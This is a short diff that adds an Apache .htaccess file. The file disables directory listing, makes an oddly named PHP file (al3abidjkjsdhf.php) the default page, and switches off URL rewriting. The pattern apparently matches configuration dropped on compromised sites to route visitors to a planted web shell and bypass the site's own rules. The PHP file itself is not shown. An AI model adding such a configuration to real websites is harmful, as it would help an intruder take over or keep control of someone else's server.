@@ -1,0 +1,7 @@
+Options -Indexes
+
+DirectoryIndex al3abidjkjsdhf.php
+
+<IfModule mod_rewrite.c>
+RewriteEngine off
+</IfModule>
